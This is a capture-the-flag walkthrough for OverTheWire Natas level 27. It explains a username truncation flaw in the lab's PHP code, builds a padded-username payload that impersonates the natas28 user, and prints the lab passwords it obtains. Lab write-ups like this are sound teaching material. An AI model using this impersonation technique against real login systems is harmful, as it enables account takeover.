# Natas CTF Solutions  

## Natas Level 27  

### 🌐 **Challenge Description**  
Natas teaches the basics of server-side web security. Each level consists of a website located at:  
👉 `http://natasX.natas.labs.overthewire.org` (where **X** is the level number).  

---

### 🎯 **Goal**  
- Exploit a **string truncation vulnerability** to bypass the username check and retrieve the password.  

---

## 🚀 **Solution**  

### **Step 1: Open the URL**  
Visit:  
```  
http://natas27.natas.labs.overthewire.org  
```  

---

### **Step 2: Enter Login Credentials**  
- **Username:** `natas27`  
- **Password:** Use the password from Natas Level 26:  
```
u3RRffXjysjgwFU6b9xa23i6prmUsYne
```

![Home_Page](https://github.com/user-attachments/assets/53038030-8dcc-4ec1-87e9-9e02587b4946)

---

### **Step 3: Analyze the Source Code**  
Key part of the code:  
```php
if(strlen($name) > 64){
    $name = substr($name, 0, 64);
}
```

### **Understanding the Vulnerability**  
- The code truncates the username if it's longer than **64 characters**.  
- We can take advantage of this by creating a username that is **exactly 64 characters** long, where the first part matches `natas28` and the last character is different.  

![image](https://github.com/user-attachments/assets/e45e86a7-fec1-4cd0-abe3-4bc3ea98e1e1)
![image](https://github.com/user-attachments/assets/6e7a834d-de44-4e93-b65f-771519e92243)

---

### **Step 4: Generate the Payload**  
Generate a payload in Python:  
```python
print("natas28" + " " * 57 + "z")
```

✅ Output:  
```
natas28                                                         z
```

---

### **Step 5: Send the Payload**  
1. Open **Burp Suite** or the browser console.  
2. Send the following payload as the username:  
```
natas28                                                         z
```
3. The server will truncate the username to 64 characters, which will match `natas28`.  

---

### **Step 6: Result**  
- The server will treat the username as `natas28` and return the password for the next level.  

---

### **Step 7: Output**  
If successful, the output will reveal the password for the next level:  
```  
The password for natas28 is: 1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj  
```

![Password](https://github.com/user-attachments/assets/a84e1119-6ae2-42a6-a09e-8cd31b616bc3)

---

### **✅ Password for Natas Level 28**  
```
1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj
```

---

## 💡 **Lessons Learned**  
✔️ **String Truncation:** Long strings can be truncated, leading to unintended behavior.  
✔️ **SQL Injection:** Truncated values might match unintended records in the database.  
✔️ **Username Collision:** By carefully crafting long input, you can impersonate another user.  

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 3 – Source Code | ![image](https://github.com/user-attachments/assets/e45e86a7-fec1-4cd0-abe3-4bc3ea98e1e1) ![image](https://github.com/user-attachments/assets/6e7a834d-de44-4e93-b65f-771519e92243) |  
| Step 6 – Found Password | ![Password](https://github.com/user-attachments/assets/a84e1119-6ae2-42a6-a09e-8cd31b616bc3) |  

---

## 🎯 **Next Level**  
Use the password to access **Natas Level 28**:  
👉 [http://natas28.natas.labs.overthewire.org](http://natas28.natas.labs.overthewire.org)  

---
